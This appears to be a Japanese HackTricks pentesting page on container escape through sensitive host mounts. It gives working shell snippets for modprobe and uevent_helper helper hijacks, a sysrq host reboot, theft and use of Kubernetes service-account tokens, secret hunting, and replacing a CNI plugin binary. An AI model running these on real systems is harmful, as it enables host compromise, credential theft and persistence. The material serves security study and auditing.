# センシティブなホストマウント

{{#include ../../../banners/hacktricks-training.md}}

## 概要

ホストマウントは、慎重に分離されたプロセスビューをホストリソースへの直接的な可視性へと戻してしまうことが多いため、最も重要な実践的 container escape の攻撃対象の一つです。危険なケースは `/` に限られません。`/proc`、`/sys`、`/var`、runtime socket、kubelet が管理する state、または device 関連のパスを bind mount すると、kernel controls、credentials、隣接する container の filesystems、runtime management interfaces が露出する可能性があります。

このページが個別の protection ページとは別に存在するのは、abuse model が横断的だからです。writable な host mount が危険なのは、mount namespaces、user namespaces、AppArmor や SELinux の適用範囲、そして公開された正確な host path の内容が、それぞれ一因となるためです。これを独立した topic として扱うことで、attack surface をはるかに容易に分析できます。

## `/proc` の露出

procfs には、通常のプロセス情報と影響の大きい kernel control interfaces の両方が含まれています。そのため、`-v /proc:/host/proc` のような bind mount や、予期せず writable な proc エントリを公開する container view によって、information disclosure、denial of service、または host 上での直接的な code execution につながる可能性があります。

価値の高い procfs のパスには、以下があります。

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

まず、価値の高い procfs エントリのうち、どれが可視または writable なのかを確認します。
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
これらのパスは、それぞれ異なる理由で興味深いものです。`core_pattern`、`modprobe`、`binfmt_misc` は、書き込み可能な場合に host code-execution の経路になり得ます。`kallsyms`、`kmsg`、`kcore`、`config.gz` は、kernel exploitation における強力な reconnaissance source です。`sched_debug` と `mountinfo` は、コンテナ内部から host layout の再構築に役立つ process、cgroup、filesystem の context を明らかにします。

各パスの実用的な価値は異なります。すべてが同じ impact を持つかのように扱うと、triage が難しくなります。

- `/proc/sys/kernel/core_pattern`
書き込み可能な場合、これは最も impact の大きい procfs パスの一つです。kernel は crash 後に pipe handler を実行するためです。コンテナから `core_pattern` を、overlay または mount された host path に保存された payload に向けられる場合、host code execution を取得できることがあります。専用の例については、[read-only-paths.md](protections/read-only-paths.md) も参照してください。
- `/proc/sys/kernel/modprobe`
このパスは、kernel が module-loading logic を呼び出す必要があるときに使用する userspace helper を制御します。コンテナから書き込み可能で、host context で解釈される場合、別の host code-execution primitive になり得ます。helper path を trigger する方法と組み合わせられる場合、特に興味深いものです。
- `/proc/sys/vm/panic_on_oom`
通常、これは clean な escape primitive ではありません。しかし、OOM condition を kernel panic behavior に変えることで、memory pressure を host-wide denial of service に変換できます。
- `/proc/sys/fs/binfmt_misc`
registration interface が書き込み可能な場合、attacker は選択した magic value に対する handler を登録し、一致する file が実行されたときに host-context execution を取得できる可能性があります。
- `/proc/config.gz`
kernel exploit triage に役立ちます。host package metadata を必要とせずに、どの subsystem、mitigation、optional kernel feature が有効になっているかを判断できます。
- `/proc/sysrq-trigger`
主に denial-of-service のパスですが、非常に深刻なものです。host を即座に reboot、panic させたり、その他の形で disruption を引き起こしたりできます。
- `/proc/kmsg`
kernel ring buffer の message を明らかにします。host fingerprinting、crash analysis、また一部の環境では kernel exploitation に役立つ情報の leak に使用できます。
- `/proc/kallsyms`
readable な場合に有用です。export された kernel symbol information を公開するため、kernel exploit development における address randomization の前提を回避するのに役立つ可能性があります。
- `/proc/[pid]/mem`
これは直接的な process-memory interface です。target process に必要な ptrace-style condition で到達できる場合、別の process の memory を読み取ったり変更したりできる可能性があります。現実的な impact は credentials、`hidepid`、Yama、ptrace restriction に大きく依存するため、強力ですが conditional なパスです。
- `/proc/kcore`
system memory の core-image-style view を公開します。この file は巨大で扱いにくいものですが、意味のある形で readable であれば、host memory surface が深刻に露出していることを示します。
- `/proc/kmem` と `/proc/mem`
歴史的に impact の大きい raw memory interface です。多くの modern system では無効化または厳しく制限されていますが、存在して使用可能な場合は critical finding として扱うべきです。
- `/proc/sched_debug`
scheduling および task information を leak します。これにより、他の process view が予想よりも整理されている場合でも、host process identity が露出する可能性があります。
- `/proc/[pid]/mountinfo`
container が host 上のどこに実際に存在するか、どの path が overlay-backed か、また writable mount が host content に対応しているのか、それとも container layer のみに対応しているのかを再構築するうえで、非常に有用です。

`/proc/[pid]/mountinfo` または overlay details が readable な場合は、それらを使用して container filesystem の host path を復元します。
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
これらのコマンドが有用なのは、いくつかの host-execution tricks で、container 内の path を host 側から見た対応する path に変換する必要があるためです。

### 完全な例: `modprobe` Helper Path Abuse

`/proc/sys/kernel/modprobe` が container から writable で、helper path が host context で解釈される場合、攻撃者が制御する payload へリダイレクトできます：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
トリガーの正確な内容は、対象と kernel の挙動によって異なりますが、重要なのは、書き込み可能な helper path によって、将来の kernel helper invocation を attacker-controlled な host-path content にリダイレクトできる可能性があるという点です。

### `kallsyms`、`kmsg`、`config.gz` を使った Kernel Recon の完全な例

目的が即時の escape ではなく exploitability assessment である場合：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
これらのコマンドは、有用なシンボル情報が可視化されているか、最近の kernel メッセージから興味深い状態が明らかになるか、またどの kernel 機能や緩和策がコンパイルに組み込まれているかを確認するのに役立ちます。影響は通常、直接的な escape ではありませんが、kernel 脆弱性の triage を大幅に短縮できます。

### 完全な例: SysRq によるホストの再起動

`/proc/sysrq-trigger` が書き込み可能で、ホスト側の view に到達する場合:
```bash
echo b > /proc/sysrq-trigger
```
効果は即座にホストの再起動として現れます。これは subtle な例ではありませんが、procfs の露出が単なる情報漏えいよりもはるかに深刻な事態につながり得ることを明確に示しています。

## `/sys` Exposure

sysfs は、カーネルおよびデバイスの状態を大量に公開します。一部の sysfs パスは主に fingerprinting に役立ちますが、その他のパスは helper の実行、デバイスの動作、security-module の設定、または firmware の状態に影響を及ぼす可能性があります。

価値の高い sysfs パスには、次のものがあります。

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスが重要となる理由はそれぞれ異なります。`/sys/class/thermal` は thermal-management の動作に影響を及ぼす可能性があり、適切に制限されていない環境ではホストの安定性に影響します。`/sys/kernel/vmcoreinfo` は crash-dump および kernel-layout に関する情報を leak する可能性があり、低レベルのホスト fingerprinting に役立ちます。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` インターフェースであるため、予期しないアクセスによって MAC 関連の状態が公開または変更される可能性があります。EFI variable のパスは firmware が保持する boot 設定に影響を及ぼす可能性があり、通常の configuration file よりもはるかに深刻です。`/sys/kernel/debug` 配下の `debugfs` は、開発者向けに意図されたインターフェースであり、production 向けに hardened されたカーネル API よりも安全性に関する想定がはるかに少ないため、特に危険です。

これらのパスを確認する際に役立つコマンドは次のとおりです。
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
これらのコマンドが興味深い理由：

- `/sys/kernel/security` によって、本来ホストだけに存在すべき AppArmor、SELinux、または別の LSM の surface が可視化されているかどうかが分かる場合があります。
- `/sys/kernel/debug` は、このグループの中でも特に警戒すべき検出結果です。`debugfs` が mount され、読み取りまたは書き込み可能な場合、kernel に直接関係する広範な surface が存在すると考えられます。正確なリスクは、有効になっている debug node によって異なります。
- EFI variable の露出はそれほど一般的ではありませんが、通常の runtime file ではなく firmware-backed setting に触れるため、存在する場合は impact が大きくなります。
- `/sys/class/thermal` は、整然とした shell-style escape よりも、主に host の安定性と hardware との interaction に関係します。
- `/sys/kernel/vmcoreinfo` は、主に host fingerprinting と crash analysis の情報源であり、低レベルな kernel state の把握に役立ちます。

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper` が writable の場合、`uevent` が trigger されたときに kernel が attacker-controlled helper を実行する可能性があります：
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
この手法が機能する理由は、helper path が host の視点から解釈されるためです。トリガーされると、helper は現在の container 内ではなく、host context で実行されます。

## `/var` の公開

host の `/var` を container にマウントすることは、`/` のマウントほど劇的には見えないため、過小評価されがちです。実際には、runtime socket、container の snapshot directory、kubelet が管理する pod volume、projected service-account token、近隣アプリケーションの filesystem に到達するには十分な場合があります。現代の node では、最も運用上重要な container state が実際に `/var` に存在することがよくあります。

### Kubernetes Example

`hostPath: /var` を持つ pod は、他の pod の projected token と overlay snapshot content を読み取れることがあります。
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
これらのコマンドが有用なのは、その mount が単なるアプリケーションデータだけを公開しているのか、それとも影響度の高い cluster credentials まで公開しているのかを確認できるためです。読み取り可能な service-account token があれば、local code execution を直ちに Kubernetes API access へ転換できる可能性があります。

token が存在する場合は、token の発見だけで止めず、それで何にアクセスできるかを検証します：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
ここでの影響は、ローカルノードへのアクセスよりもはるかに大きい可能性があります。広範な RBAC 権限を持つ token によって、マウントされた `/var` が cluster 全体の compromise につながる可能性があります。

### Docker と containerd の例

Docker ホストでは、関連するデータは通常 `/var/lib/docker` 配下にあります。一方、containerd ベースの Kubernetes ノードでは、`/var/lib/containerd` または snapshotter 固有のパス配下にある場合があります。
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
マウントされた `/var` に別のワークロードの書き込み可能な snapshot の内容が公開されている場合、攻撃者は現在のコンテナ設定に触れることなく、アプリケーションファイルの改変、Web コンテンツの設置、または startup スクリプトの変更を行える可能性があります。

書き込み可能な snapshot の内容が見つかった場合の具体的な悪用方法:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
これらのコマンドが有用なのは、mounted `/var` による主な3つの影響カテゴリ、すなわちアプリケーションの改ざん、secret の回収、近隣 workload への lateral movement を示すためです。

## Kubelet State、Plugins、CNI Paths

`/var/lib/kubelet`、`/opt/cni/bin`、または `/etc/cni/net.d` の mount は、privileged DaemonSets、CNI agents、CSI node plugins、GPU operators、storage helpers を通じて公開されることがよくあります。これらの mount は「node plumbing」として軽視されがちですが、新しい pod の実行経路に直接存在し、kubelet の認証情報、projected secrets、registration sockets、実行可能な host-side plugin binaries が含まれていることがよくあります。

価値の高いターゲットには、以下が含まれます。

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful な review commands は以下のとおりです。
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
なぜこれらのパスが重要なのか:

- `/var/lib/kubelet/pki` には、kubelet のクライアント証明書やその他の node-local credentials が含まれている場合があり、cluster の設計によっては、API server や kubelet-facing TLS endpoints に対して再利用できることがあります。
- `/var/lib/kubelet/pods` には、同じ node 上にある近隣の pod 用に投影された service-account tokens や mounted Secrets が含まれていることがよくあります。
- `/var/lib/kubelet/pod-resources/kubelet.sock` は主に reconnaissance surface ですが、非常に有用です。現在どの pod や container が GPU、hugepages、SR-IOV devices、その他の node-local resources を使用しているかが明らかになります。
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins`、`/var/lib/kubelet/plugins_registry` からは、インストールされている CSI、DRA、device plugins と、kubelet が通信する想定の sockets が明らかになります。これらの directories が単に読み取り可能なだけでなく書き込み可能な場合、finding ははるかに深刻になります。
- `/opt/cni/bin` と `/etc/cni/net.d` は、pod-network setup path の直接上に位置しています。そこへの書き込みアクセスは、単なる configuration exposure ではなく、遅延実行型の host-execution primitive になることがよくあります。

### Writable `/opt/cni/bin` の完全な例

host CNI binary directory が read-write で mount されている場合、plugin を置き換えるだけで、その node 上で kubelet が次に pod sandbox を作成した際に host execution を取得できる可能性があります:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
これはマウントされた `docker.sock` ほど即時性はありませんが、侵害された Kubernetes infrastructure pod では、より現実的なケースが多くあります。重要なのは、変更されたバイナリが現在のコンテナによってではなく、後から host network setup flow によって実行される点です。


## Runtime Sockets

Sensitive host mounts には、ディレクトリ全体ではなく Runtime Sockets が含まれていることがよくあります。これらは非常に重要であるため、ここで明示的に繰り返し説明する価値があります：
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
[runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) を参照すると、これらのソケットのいずれかが mount された後の完全な exploit フローを確認できます。

最初の簡単なインタラクションパターンとして:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
これらのいずれかが成功すると、「mounted socket」から「より高い権限を持つ sibling container の起動」へ至る経路は、通常、カーネル breakout の経路よりもはるかに短くなります。

## Writable Host Path Task Hijack

Writable host mount は、危険になるために `/` を公開する必要はありません。マウントされたパスに、スクリプト、設定ファイル、hooks、plugins、または host-side の scheduled task や service が後で使用するファイルが含まれている場合、container は host が実行する内容を変更できる可能性があります。

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
ホストプロセスが書き込み可能なファイルを使用する場合、テスト中はペイロードをシンプルで観測可能な状態に保つ：
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
興味深い点は trust boundary です。書き込みは container 内から行われますが、実行は後から host service context で行われます。これにより、狭い hostPath や bind mount が、遅延した host-code-execution primitive に変わります。

## Mount-Related CVEs

Host mount は runtime の脆弱性とも関係します。最近の重要な例には、次のものがあります。

- `runc` の `CVE-2024-21626`。leaked directory file descriptor により、working directory を host filesystem 上に配置できました。
- BuildKit の `CVE-2024-23651`、`CVE-2024-23652`、`CVE-2024-23653`。悪意のある Dockerfile、frontend、および `RUN --mount` flow により、build 中に host file へのアクセス、削除、または elevated privileges が再び可能になる場合がありました。
- Buildah および Podman build flow の `CVE-2024-1753`。細工した bind mount により、build 中に `/` を read-write で公開できました。
- `containerd` 2.1.0 の `CVE-2025-47290`。image unpack 中の TOCTOU により、特別に細工された image が pull 中に host filesystem を変更できました。

これらの CVE がここで重要なのは、mount handling が operator configuration だけの問題ではないことを示しているためです。runtime 自体が mount-driven escape condition を引き起こす可能性もあります。

## Checks

次のコマンドを使用して、影響の大きい mount exposure を迅速に特定します。
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
ここで注目すべき点：

- Host root、`/proc`、`/sys`、`/var`、および runtime sockets は、すべて優先度の高い検出対象です。
- 書き込み可能な proc/sys エントリは、多くの場合、安全な container view ではなく、host-global な kernel controls を mount が公開していることを意味します。
- mount された `/var` のパスは、ファイルシステムの確認だけでなく、credential と隣接する workload のレビューも必要です。
- Kubelet の state directories と CNI/plugin のパスは、runtime sockets と同じ優先度で確認する必要があります。これらは多くの場合、node の pod-creation および credential-distribution path に直接存在するためです。

## References

- [Kubelet が使用する Local Files And Paths](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [`hostPath` mount を介して host にアクセスできる cilium-agent container](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
